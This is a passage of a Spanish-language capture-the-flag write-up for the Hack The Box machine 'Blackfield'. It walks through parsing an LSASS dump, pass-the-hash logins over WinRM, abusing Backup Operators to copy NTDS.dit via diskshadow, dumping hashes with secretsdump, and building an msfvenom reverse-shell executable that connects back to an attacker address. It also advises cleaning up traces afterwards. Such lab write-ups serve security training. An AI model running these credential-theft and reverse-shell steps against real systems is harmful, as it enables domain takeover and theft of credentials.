Tras la ejecución del comando, se detecta que el usuario `audit2020` tiene acceso a un recurso compartido llamado `forensic`, el cual no estaba disponible para el usuario `support`:

![imagen 25](Pasted image 20230721191009.png)

Para investigar más a fondo este recurso compartido, se utiliza la herramienta `smbmap`:

```bash
r1pfr4n@parrot> smbmap -H 10.10.10.192 -u 'audit2020' -p 'fran123$!' -r forensic
```

El recurso compartido `forensic` está formado por un conjunto de subcarpetas que contienen información relevante para la investigación:

![imagen 26](Pasted image 20230721191116.png)

Para facilitar el acceso y análisis de estos archivos, se crea una montura del recurso compartido `forensic` en el sistema local con el siguiente comando:

```bash
r1pfr4n@parrot> sudo mount -t cifs //10.10.10.192/forensic /mnt/forensic -o 'username=audit2020,password=fran123$!'
```

Antes de ejecutar el comando, se aseguró de crear una carpeta llamada `forensic` en el directorio `/mnt/` para albergar la montura del recurso compartido `forensic`. Una vez realizada la montura, en el interior de `/mnt/forensic`, se pueden ver las siguientes tres carpetas que se visualizaron previamente con `smbmap`:

1. **commands_output**: Esta carpeta contiene archivos con volcados de **comandos ejecutados en la máquina**. Estos registros pueden proporcionar información sobre la configuración de red, reglas de firewall y otros aspectos del sistema que pueden ser útiles para conocer más detalles sobre el entorno objetivo.
2. **memory_analysis**: Esta carpeta alberga archivos comprimidos que contienen **volcados de la memoria** de la máquina víctima.
3. **tools**: Se encuentran subcarpetas que sugieren contener **herramientas** como *sysinternals* y *volatility*.

Dentro de los archivos comprimidos en la carpeta `memory_analysis`, el volcado de `lsass.zip` es especialmente relevante:

![imagen 27](Pasted image 20230721192310.png)

#### LSASS: una visión general

**LSASS (Local Security Authority Subsystem Service)** es un componente crucial del sistema operativo Windows, encargado de manejar la **autenticación de usuarios en el sistema** y de mantener la seguridad de las credenciales de los usuarios.

En esencia, cuando un usuario inicia sesión en una computadora con Windows, el LSASS verifica las credenciales de este usuario. Para hacer esto, **almacena** información sensible en la memoria, como los **hashes de las contraseñas de los usuarios**, que son representaciones cifradas de las contraseñas.

Obtener acceso a un volcado de LSASS puede ser extremadamente valioso desde una perspectiva de ataque. Como el LSASS almacena hashes de contraseñas en memoria, un volcado de este proceso potencialmente contendría estos **hashes**, que **podrían ser extraídos y utilizados para autenticarse como cualquier usuario** cuyo hash se haya obtenido.

Este tipo de ataque, conocido como **ataque Pass-The-Hash (PTH)**, puede permitir a un atacante autenticarse directamente como un usuario específico, sin necesidad de conocer la contraseña real de este usuario. De esta forma, un atacante puede moverse lateralmente dentro de una red y escalar privilegios sin tener que descifrar ninguna contraseña.

#### Análisis del volcado del LSASS

Tras obtener el volcado de `lsass.zip`, se procede a descomprimirlo en el directorio de trabajo. Para analizar la información relevante que se encuentra en el volcado de LSASS, se utiliza la herramienta `pypykatz`, que es una implementación en Python de la conocida herramienta `mimikatz`. La ventaja de `pypykatz` es que permite ejecutar funcionalidades similares a las de `mimikatz` pero en un entorno Linux, algo especialmente útil en este escenario.

La instalación de `pypykatz` puede realizarse mediante el comando siguiente:

```bash
r1pfr4n@parrot> pip3 install pypykatz
```

Tras su instalación, se procede a analizar el volcado de LSASS con el comando:

```bash
r1pfr4n@parrot> pypykatz lsa minidump lsass.DMP
```

Dentro del volcado de memoria "lsass.DMP", se descubre información relevante sobre las **credenciales** almacenadas en el sistema. En particular, se obtienen los **hashes NT de varios usuarios** significativos en el dominio "BLACKFIELD". Los hashes NT obtenidos se presentan en la siguiente tabla:

| Usuario        | Hash NT                              |
| -------------- | ------------------------------------ |
| svc_backup     | 9658d1d1dcd9250115e2205d9f48400d     |
| DC01$          | b624dc83a27cc29da11d9bf25efea796     |
| Administrator  | 7f1e4ff8c6a8e6b6fcae2d9c0572cd62     |

No obstante, no todos los hashes obtenidos son útiles en este contexto. Los hashes NT correspondientes al usuario `Administrator` y a la cuenta de la máquina `DC01$` resultan ser inválidos, muy probablemente porque las contraseñas asociadas han cambiado desde que se realizó el volcado de LSASS.

Por otro lado, el **hash NT** del usuario `svc_backup` resulta ser **válido**:

![imagen 28](Pasted image 20230721193139.png)

### Obtención de shell a través de WinRM como svc_backup

Ahora que se ha obtenido las credenciales de `svc_backup`, es posible avanzar y explorar nuevas formas de explotación. En concreto, se buscará acceder a la máquina objetivo utilizando el servicio **Windows Remote Management (WinRM)**.

**WinRM** es un servicio de administración remota basado en estándares que se incluye con Windows Server. Permite a los administradores de sistemas ejecutar comandos de administración y scripts en sistemas remotos a través de la red. Recordemos que, durante la fase de escaneo inicial, se identificó que el puerto **5985**, el puerto predeterminado para WinRM, estaba abierto.

Antes de intentar la conexión, es importante verificar que el usuario `svc_backup` tiene permisos para acceder al servicio WinRM. Para ello, se utiliza la herramienta `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

Este comando verifica si las credenciales proporcionadas permiten el acceso al servicio WinRM en el host objetivo. Si el resultado muestra `Pwned!`, eso indica que el usuario `svc_backup` tiene los permisos necesarios para acceder a WinRM, probablemente debido a que pertenece al grupo `Remote Management Users`.

![imagen 29](Pasted image 20230721193222.png)

Una vez confirmado el acceso, se puede conectar a WinRM utilizando la herramienta `evil-winrm`:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

`Evil-winrm` es una herramienta de shell interactiva que permite la administración remota de la máquina objetivo. Al ejecutar el comando anterior, se inicia una conexión con la máquina objetivo a través del servicio WinRM utilizando las credenciales de `svc_backup`. Si todo sale según lo previsto, se obtendrá una shell que permitirá una exploración más profunda del sistema:

![imagen 30](Pasted image 20230721193440.png)

### user.txt

Encontraremos la **primera flag** en el directorio **Desktop** del usuario **svc_backup**:

```powershell
PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef***27e2852be64b543
```

## Obteniendo shell como Administrador del Dominio

Después de obtener una _shell_ inicial con el usuario _svc_backup_, el siguiente objetivo es escalar privilegios hasta conseguir una _shell_ como **administrador del dominio**. Para esto, se debe realizar una serie de tareas de enumeración y explotación adicionales.

### Identificando privilegios y grupos de svc_backup

Comenzando con la enumeración, se utiliza el comando `whoami /all`. Este comando resulta útil para mostrar detalles extensos sobre el usuario actual y su membresía en cualquier grupo de seguridad, ofreciendo una visión completa de los privilegios del usuario, los grupos a los que pertenece y los niveles de acceso que tiene en el sistema.

El resultado se muestra a continuación:

![imagen 31](Pasted image 20230724201431.png)

Se revela que el usuario _svc_backup_ es miembro de un grupo no común denominado `BUILTIN\Backup Operators`. De acuerdo con la [documentación oficial de Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups), este grupo posee privilegios que permiten a sus miembros eludir las restricciones de seguridad de archivos para realizar **copias de seguridad y restauración**.

Los miembros del grupo `BUILTIN\Backup Operators` tienen la capacidad de leer y escribir cualquier archivo del sistema, independientemente de los permisos de seguridad establecidos para dichos archivos. Esta característica puede ser aprovechada por un atacante para acciones como volcar la SAM del equipo o incluso el NTDS, archivos que contienen datos sensibles del sistema y del dominio respectivamente.

Es relevante destacar que _svc_backup_ tiene dos privilegios no comunes: `SeBackupPrivilege` y `SeRestorePrivilege`. Estos son privilegios especiales otorgados a los usuarios que forman parte del grupo `BUILTIN\Backup Operators`. El privilegio **SeBackupPrivilege** permite a los usuarios realizar operaciones de respaldo en el sistema, mientras que **SeRestorePrivilege** permite realizar operaciones de restauración.

A continuación, se adjunta una imagen con la información oficial que proporciona [Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) sobre el grupo `Backup Operators`:

![imagen 32](Pasted image 20230724194738.png)

Dado que estos privilegios permiten a los usuarios leer y escribir en cualquier archivo del sistema, se pueden utilizar para explotar el sistema y escalar privilegios hasta el nivel de **administrador del dominio**.

### Explotación de Backup Operators para leer la segunda flag (Intento Fallido)

Un pensamiento razonable que puede surgir al conocer los privilegios de `Backup Operators` sería considerar la posibilidad de **leer la segunda flag de la máquina**, terminar el desafío y celebrar el éxito. Sin embargo, el escenario es más complicado y esta estrategia, a pesar de ser lógica, no proporcionará los resultados deseados.

Como se explicó anteriormente, los miembros del grupo `Backup Operators` tienen el privilegio `SeBackupPrivilege`, que permite eludir las restricciones de seguridad de los archivos para realizar operaciones de respaldo. Con este enfoque, se podría suponer que la segunda flag, generalmente localizada en el directorio `Desktop` del usuario `Administrator`, sería accesible.

Para intentar esta estrategia, se recurre a un [repositorio en GitHub](https://github.com/giuliano108/SeBackupPrivilege), que proporciona dos archivos DLL que, una vez importados a la máquina objetivo, permiten **leer archivos** aprovechándose de los privilegios de `Backup Operators`, específicamente del privilegio `SeBackupPrivilege`.

Los archivos DLL a utilizar son:

- [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll)
- [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll)

Estos archivos se descargan en la máquina local y se suben al DC utilizando el comando `upload` de `evil-winrm`:

```powershell
PS C:\Users\svc_backup\Documents> upload /home/r1pfr4n/Desktop/HTB/Blackfield/content/SeBackupPrivilegeCmdLets.dll
PS C:\Users\svc_backup\Documents> upload /home/r1pfr4n/Desktop/HTB/Blackfield/content/SeBackupPrivilegeUtils.dll
```

Posteriormente, se importan en la máquina objetivo:

```powershell
PS C:\Users\svc_backup\Documents> import-module .\SeBackupPrivilegeCmdLets.dll
PS C:\Users\svc_backup\Documents> import-module .\SeBackupPrivilegeUtils.dll
```

Con los módulos cargados, el comando `Copy-FileSeBackupPrivilege` se convierte en una herramienta para aprovechar el privilegio `SeBackupPrivilege` y copiar cualquier archivo del sistema. Al examinar el directorio `Desktop` del usuario `Administrator`, se encuentra un archivo adicional llamado `notes.txt`. Si se intenta copiar este archivo en el directorio actual, la operación tiene éxito:

```powershell
PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\notes.txt notes.txt
```

Resultado:

![imagen 33](Pasted image 20230725190359.png)

Sin embargo, al intentar el mismo proceso con el archivo `root.txt`, se recibe un mensaje de "**Acceso denegado**":

![imagen 34](Pasted image 20230725190439.png)

El porqué de este comportamiento se explicará en detalle en el [Anexo I](#anexo-i-análisis-del-problema-de-lectura-de-la-segunda-flag). 

### Explotando Backup Operators para volcar NTDS

Continuando con la exploración de las posibilidades que ofrecen los privilegios de `Backup Operators`, se procede a intentar una operación de **volcado del NTDS** (New Technology Directory Services)

El **enfoque general** de este proceso implica aprovechar los privilegios otorgados al grupo de Backup Operators para **extraer el archivo SYSTEM y NTDS.dit** del Controlador de Dominio (DC), trasladar estos archivos a la máquina atacante y, finalmente, utilizar `secretsdump.py` de Impacket para **volcar el NTDS** de forma local.

Aunque podría ser también relevante **volcar la SAM**, para mantener la claridad y concisión de este WriteUp, la discusión sobre el volcado de la SAM se trasladará al [Anexo II](#anexo-ii-proceso-de-volcado-del-registro-de-seguridad-de-cuentas-sam) de este documento.

#### ¿Qué es NTDS?

El **NTDS** es una **base de datos** que **almacena información sobre los objetos en un dominio, incluidos los usuarios, grupos y computadoras.** Es un componente crucial de cualquier entorno de Active Directory, ya que es responsable de mantener y administrar la información de seguridad de todos los objetos de un dominio. Si un atacante puede obtener acceso a este archivo, puede tener la capacidad de extraer información confidencial, como **contraseñas** de usuario y **hashes** de contraseñas.

Para el volcado local del NTDS con `secretsdump.py`, se necesitan dos archivos: **SYSTEM** y **NTDS.dit**.

- **SYSTEM**: Este archivo contiene información sobre la configuración del sistema, incluyendo la configuración del sistema operativo y los servicios instalados.
  
- **NTDS.dit**: Este es el archivo de base de datos principal para Active Directory. Contiene todas las relaciones de confianza de Active Directory, los detalles de la cuenta de usuario (incluidas las contraseñas) y la información de la membresía del grupo.

#### Extracción del archivo SYSTEM

El primer paso es obtener el archivo **SYSTEM**. Este proceso es sencillo y se puede lograr ejecutando el siguiente comando:

```powershell
PS C:\Users\svc_backup\Desktop> reg.exe save hklm\system system.save
```

Posteriormente, este archivo se traslada a la máquina atacante utilizando el comando `download` de **evil-winrm**:

```powershell
PS C:\Users\svc_backup\Desktop> download C:\Users\svc_backup\Desktop\system.save
```

No obstante, la extracción del archivo **NTDS.dit** presenta **mayor dificultad**, dado que el sistema operativo interactúa constantemente con este archivo, **imposibilitando una copia directa**. Esto significa que incluso utilizando herramientas como el comando `Copy-FileSeBackupPrivilege` explorado anteriormente, no se lograría obtener una copia del archivo NTDS debido a la constante interacción del sistema operativo con él.

#### Extracción del archivo NTDS.dit mediante DiskShadow

La extracción del archivo NTDS.dit se realiza siguiendo la información proporcionada por [Pentestlab](https://pentestlab.blog/tag/diskshadow/), que ofrece diversos métodos para esta tarea. Para este WriteUp, se utiliza una versión modificada de uno de estos métodos, ajustada según las necesidades del contexto.

La herramienta elegida para este proceso es **DiskShadow**, un binario firmado por Microsoft creado para ayudar en tareas relacionadas con el Servicio de Copia de seguridad de Volumen (VSS). DiskShadow permite el uso de archivos de script para automatizar la extracción de NTDS.dit, facilitando el proceso.

El primer paso es la creación de un **script** llamado **diskshadow.txt**, compuesto por los siguientes comandos. Es importante recordar que es **necesario** añadir un **espacio al final de cada línea** para asegurar la correcta ejecución:

```shell
set context persistent nowriters 
set metadata c:\Windows\Temp\c.cab 
add volume c: alias r1pfr4n 
create 
expose %r1pfr4n% x: 
```

La función de cada comando se detalla a continuación:

- **set context persistent nowriters**: Configura el contexto del escritor VSS en persistente y desactiva los escritores VSS.
- **set metadata c:\\Windows\\Temp\\c.cab**: Define la ubicación donde se almacenarán los metadatos de la copia de seguridad.
- **add volume c: alias r1pfr4n**: Agrega el volumen a copiarse con un alias específico. En este caso, se utiliza "r1pfr4n" como alias.
- **create**: Genera una copia de seguridad del volumen especificado.
- **expose %r1pfr4n% x:**: Presenta la copia de seguridad como una unidad de disco (x:) en el sistema.

Este script se origina en la máquina atacante y se transfiere a la máquina objetivo utilizando el comando `upload` de **evil-winrm**:

```powershell
PS C:\Users\svc_backup\Desktop> upload /home/r1pfr4n/Desktop/HTB/Blackfield/content/diskshadow.txt
```

Una vez subido el script, se ejecuta el comando siguiente en el directorio donde se encuentra el archivo diskshadow.txt:

```powershell
PS C:\Users\svc_backup\Desktop> diskshadow.exe /s diskshadow.txt
```

Tras su ejecución, se debería ver una salida similar a la siguiente:

![imagen 35](Pasted image 20230724204720.png)

Este comando genera una copia del sistema de archivos en la **unidad lógica x**. A continuación, se emplea la herramienta `robocopy` para **copiar el archivo ntds.dit a la ubicación deseada**:

```powershell
PS C:\Users\svc_backup\Desktop> robocopy /b x:\Windows\NTDS\ . ntds.dit
```

En este caso, se transfiere el archivo `x:\Windows\NTDS\ntds.dit` al directorio en uso, que es `C:\Users\svc_backup\Desktop`:

![imagen 36](Pasted image 20230724205259.png)

Para finalizar, se descarga el archivo ntds.dit utilizando el comando `download` de evil-winrm:

```powershell
PS C:\Users\svc_backup\Desktop> download C:\Users\svc_backup\Desktop\ntds.dit
```

#### Limpieza Post-Extracción (recomendable)

Una vez se ha copiado el archivo **ntds.dit** y descargado a la máquina atacante, es recomendable realizar la limpieza de los rastros de la actividad realizada en la máquina víctima. En concreto, **se recomienda** **eliminar el volumen creado en el proceso de copiado** (en este caso, el volumen x).

Para ello, se crea un **segundo script** de DiskShadow denominado **cleanup.txt** que tiene por finalidad eliminar el volumen que se creó durante la extracción de **ntds.dit**. Este script contiene el siguiente comando:

```powershell
delete shadows volume x: 
```

Este script se genera en la máquina atacante y se carga en la máquina víctima utilizando el comando `upload` de **evil-winrm**:

```powershell
PS C:\Users\svc_backup\Desktop> upload /home/r1pfr4n/Desktop/HTB/Blackfield/content/cleanup.txt
```

Una vez subido, se ejecuta el siguiente comando en el mismo directorio donde se aloja cleanup.txt:

```powershell
PS C:\Users\svc_backup\Desktop> diskshadow.exe /s cleanup.txt
```

Después de ejecutar este comando, el volumen x debería estar eliminado, reduciendo así la huella digital en la máquina víctima:

![imagen 37](Pasted image 20230724214903.png)

Con el archivo **ntds.dit** y **SYSTEM** en la máquina atacante, ahora es posible proceder a utilizar `secretsdump.py` de Impacket para volcar la base de datos NTDS y extraer las credenciales del usuario administrador del dominio. 

#### Volcado de NTDS con secretsdump.py

Disponiendo de los archivos **ntds.dit** y **system.save** en la máquina atacante, es posible ejecutar el comando `secretsdump.py` para volcar el contenido de NTDS de la siguiente manera:

```shell
r1pfr4n@parrot> secretsdump.py -system system.save -ntds ntds.dit LOCAL
```

Los parámetros empleados en este comando se describen a continuación:

- `-system system.save`: Identifica el archivo de sistema a utilizar. Aquí, es `system.save`, extraído previamente del Controlador de Dominio.
- `-ntds ntds.dit`: Especifica el archivo de la base de datos NTDS a emplear. En este caso, se usa el archivo `ntds.dit`, también extraído anteriormente.
- `LOCAL`: Indica que se realizará un volcado local de NTDS, lo que implica que `secretsdump.py` buscará los archivos especificados en la máquina local en lugar de intentar conectar y extraer los archivos de una máquina remota.

Como resultado de este comando, se obtendrá un **volcado de las credenciales de los usuarios del dominio**, que se mostrará en el siguiente formato:

```
<NombreUsuario>:<RID>:<hashLM>:<hashNT>:::
```

![imagen 38](Pasted image 20230724211803.png)

Por ejemplo:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

Esta línea incluye:

- `Administrator`: Corresponde al nombre de usuario. Aquí, es el usuario Administrador.
- `500`: Este es el Relative Identifier (RID), un identificador único para cada cuenta de usuario en un dominio.
- `aad3b435b51404eeaad3b435b51404ee`: Es el hash del tipo LM (LAN Manager).
- `184fb5e5178480be64824d4cd53b99ee`: Este es el hash NT, versión más segura y actual del hash de la contraseña.

El hash NT, en este caso `184fb5e5178480be64824d4cd53b99ee`, puede ser usado para autenticarse en el Controlador de Dominio como administrador. Dado que el servicio winrm está abierto, es posible utilizar `evil-winrm` para conectar:

```shell
r1pfr4n@parrot> evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
```

Al ejecutar este comando, se iniciará una sesión en el Controlador de Dominio como el usuario Administrador:

![imagen 39](Pasted image 20230724220249.png)

En una inspección más detallada del volcado de NTDS, se puede confirmar que las **contraseñas** asociadas a las cuentas "**Administrator**" y "**DC01\$**" **han cambiado** desde que se realizó el **volcado LSASS** encontrado en el recurso compartido memory_analysis. Los hashes NT para "Administrator" y "DC01$" en el NTDS son "184fb5e5178480be64824d4cd53b99ee" y "7f82cc4be7ee6ca0b417c0719479dbec", respectivamente, diferentes a los hashes "7f1e4ff8c6a8e6b6fcae2d9c0572cd62" y "b624dc83a27cc29da11d9bf25efea796" almacenados en el volcado LSASS.DMP.

### root.txt

La segunda flag se encuentra en el directorio **Desktop** del usuario **Administrator**:

```powershell
PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c6***e29db269060c955cb
```

## Anexo I: Análisis del Problema de Lectura de la Segunda Flag

Este Anexo busca esclarecer el problema encontrado durante la lectura de la segunda flag contenida en el archivo `root.txt`. A pesar de que el usuario `svc_backup` es miembro del grupo `Backup Operators`, y ostenta privilegios amplios, encontró limitaciones para la lectura de este archivo. En esta sección, analizaremos este inconveniente con detalles sobre la encriptación de archivos y las especificidades de las sesiones en Windows.

El archivo `notes.txt`, ubicado en el escritorio del usuario Administrator, resulta relevante para entender este problema:

![imagen 40](Pasted image 20230725231147.png)

La lectura del archivo `notes.txt` revela la encriptación del archivo `root.txt`. Este elemento de seguridad podría estar impidiendo la lectura del archivo por parte del usuario `svc_backup`, aunque sea miembro del grupo `Backup Operators`.

En una verificación de los permisos del archivo `root.txt` utilizando `icacls root.txt`, se encuentra:

![imagen 41](Pasted image 20230725231112.png)

Estos resultados indican que solamente el `SYSTEM`, los `Administrators` y el `Administrator` de `BLACKFIELD` poseen permisos completos para este archivo.

Es importante mencionar que aunque el grupo `Backup Operators` posee privilegios que permiten la lectura de cualquier archivo en el sistema, estos se aplican en el contexto del `SYSTEM` y no del `Administrator`. Esto implica que un miembro del grupo `Backup Operators` accede a los archivos como si fuera `SYSTEM`.

Al ejecutar el comando `cipher /c root.txt`, que brinda información sobre la encriptación de archivos en Windows, obtenemos:

![imagen 42](Pasted image 20230725231300.png)

Aunque este resultado sugiere que `root.txt` está encriptado, no especifica quién lo encriptó. Además, al intentar ejecutar este comando, se recibe un mensaje de "Acceso denegado", lo cual resulta desconcertante dado que `svc_backup` tiene permisos de administrador del dominio.

En el sistema operativo Windows, los procesos están divididos en diferentes sesiones. A menudo, estos procesos tienen distintos niveles de permisos según la sesión a la que pertenezcan. Al establecer una conexión a través de `winrm`, se crea un proceso `wsmprovhost` que, por defecto, pertenece a la sesión 0:

![imagen 43](Pasted image 20230725233057.png)

Los procesos en la sesión 0 tienen ciertas limitaciones y no pueden interactuar plenamente con ciertos elementos del sistema, como la herramienta `cipher`.

El objetivo ahora es migrar a un proceso que pertenezca a la sesión 1, que no posee estas limitaciones. Para lograr esto, se utilizará **Metasploit** para migrar a la sesión deseada. Primero, se crea un archivo ejecutable malicioso con `msfvenom` que, cuando se ejecuta en la máquina víctima, envía una shell de Meterpreter a la máquina atacante.

El comando para crear este archivo ejecutable malicioso es:

```bash
r1pfr4n@parrot>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f exe > malicious.exe
```

En este comando, `-p` especifica el payload que se utilizará (una shell inversa de Meterpreter para Windows), `LHOST` y `LPORT` son la dirección IP y el puerto donde la máquina atacante estará escuchando, `-f` define el formato de salida (un archivo .exe en este caso) y `> malicious.exe` es el archivo de salida.

Una vez creado, el archivo malicioso se sube a la máquina víctima con el comando `upload`:

```powershell
C:\Users\Administrator\Desktop upload /home/r1pfr4n/Desktop/HTB/Blackfield/content/malicious.exe
```

Después, en la máquina atacante, se inicia `msfconsole` y se utiliza el exploit `exploit/multi/handler` para escuchar y recibir la shell de Meterpreter. Los comandos que se ejecutan son:


```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.11
exploit -j
```

La siguiente captura de pantalla presenta el resultado exitoso de la configuración del módulo `exploit/multi/handler`.

![imagen 44](Pasted image 20230725220217.png)

Procediendo con el ataque, se ejecuta `malicious.exe` en la máquina objetivo. Como resultado, se obtiene una sesión de Meterpreter en la máquina atacante, a la que se accede mediante el comando `sessions -i NUMERO_SESION`.

![imagen 45](Pasted image 20230725220424.png)

Una vez en la shell de Meterpreter, se lleva a cabo la verificación del ID del proceso en ejecución actual mediante `getpid`. Posteriormente, con el comando `ps`, se confirma que dicho proceso pertenece a la sesión 0.

![imagen 46](Pasted image 20230725220852.png)

El siguiente paso es la migración de procesos. Para salir de la limitada sesión 0, se emplea el comando `migrate` junto con el **PID** de un **proceso** **perteneciente** a la **sesión 1**, seleccionado de la lista proporcionada por `ps`.

![imagen 47](Pasted image 20230725222106.png)

Finalmente, se abre una shell y se vuelve a invocar el comando `cipher /c root.txt`. En esta ocasión, la ejecución del comando se realiza sin contratiempos, dejando al descubierto que `root.txt` está cifrado y que `BLACKFIELD\Administrator` es la única cuenta con permisos para descifrarlo.

![imagen 48](Pasted image 20230725222416.png)

Resumiendo, `svc_backup`, pese a pertenecer al grupo `Backup Operators`, no fue capaz de leer `root.txt`. La razón de esta incapacidad radica en que los permisos de este grupo funcionan a nivel de `SYSTEM` y `SYSTEM` no puede leer archivos cifrados, dado que la clave de descifrado se encuentra vinculada al `Administrador` del dominio.

El análisis aquí descrito fue posible gracias a la contribución del WriteUp de 0xdf para resolver este mismo caso. Para obtener información adicional, se puede consultar el siguiente enlace: [https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#beyond-root---efs](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#beyond-root---efs).

## Anexo II: Proceso de Volcado del Registro de Seguridad de Cuentas (SAM)

El Registro de Seguridad de Cuentas (conocido como **SAM**, por sus siglas en inglés) es una **base de datos** en el sistema operativo Windows que **almacena las contraseñas** de los **usuarios locales** en formato hash. La SAM es relevante en términos de seguridad informática y administración de contraseñas, ya que es la principal base de datos que Windows emplea para guardar las credenciales de los usuarios.

Es importante resaltar que en un entorno de Directorio Activo, la prioridad suele ser el volcado de la base de datos NTDS en lugar de la SAM. Esto se debe a que la base de datos **NTDS** contiene información de **todas las cuentas de usuario y contraseñas del dominio**, mientras que la **SAM** únicamente almacena información de las **cuentas locales de la máquina en la que reside**. Sin embargo, el volcado de la SAM puede ser útil para obtener las contraseñas de cuentas locales, lo cual puede resultar relevante en algunos escenarios.

Realizar un volcado de la SAM resulta más sencillo que el de la NTDS. Para llevarlo a cabo de manera local con la herramienta `secretsdump.py`, se necesitan dos archivos: **SYSTEM** y **SAM**.

Para extraer el archivo **SYSTEM**, se utiliza el siguiente comando, de forma similar a como se procedería en el caso del volcado de la NTDS:

```powershell
PS C:\Users\svc_backup\Desktop> reg.exe save hklm\system system.save
```

El archivo **SAM** se extrae empleando el siguiente comando:

```powershell
PS C:\Users\svc_backup\Desktop> reg.exe save hklm\sam sam.save
```

Tras la extracción, estos archivos son transferidos a la máquina atacante. Este paso puede realizarse con el comando `download` de `evil-winrm`:

```powershell
PS C:\Users\svc_backup\Desktop> download C:\Users\svc_backup\Desktop\system.save
PS C:\Users\svc_backup\Desktop> download C:\Users\svc_backup\Desktop\sam.save
```

Finalmente, se ejecuta el siguiente comando en la máquina atacante:

```shell
r1pfr4n@parrot> secretsdump.py -sam sam.save -system system.save LOCAL
```

Los parámetros empleados en este comando son los siguientes:

- `-sam sam.save`: Identifica el archivo SAM que se usará. En este caso, se utiliza `sam.save`, que fue extraído previamente de la máquina objetivo.
- `-system system.save`: Especifica el archivo del sistema a usar, que es `system.save` en este ejemplo.
- `LOCAL`: Señala que el volcado de SAM se realizará de manera local. Esto implica que `secretsdump.py` buscará los archivos especificados en la máquina local, en lugar de intentar conectar y extraer los archivos de una máquina remota.

El resultado obtenido será similar al siguiente:

![imagen 49](Pasted image 20230724234957.png)

Es esencial entender que la cuenta "Administrator" mostrada en este volcado de SAM no es la misma que la cuenta de "Administrator" del dominio. Aunque ambas comparten el mismo nombre, son cuentas totalmente distintas. La cuenta "Administrator" en este volcado de SAM es una cuenta local del sistema, no una cuenta de dominio. En consecuencia, las credenciales de esta cuenta "Administrator" no otorgarían acceso como administrador del dominio.

Además, es importante tener en cuenta que las credenciales de la cuenta "Administrator" de la SAM pueden no resultar útiles en la práctica. Esto se debe a que la cuenta "Administrator" local suele estar deshabilitada por defecto en muchos sistemas Windows, en particular en los servidores, como medida de seguridad para prevenir el acceso no autorizado al sistema. Por lo tanto, en el caso de intentar utilizar estas credenciales, es probable que el acceso sea denegado.



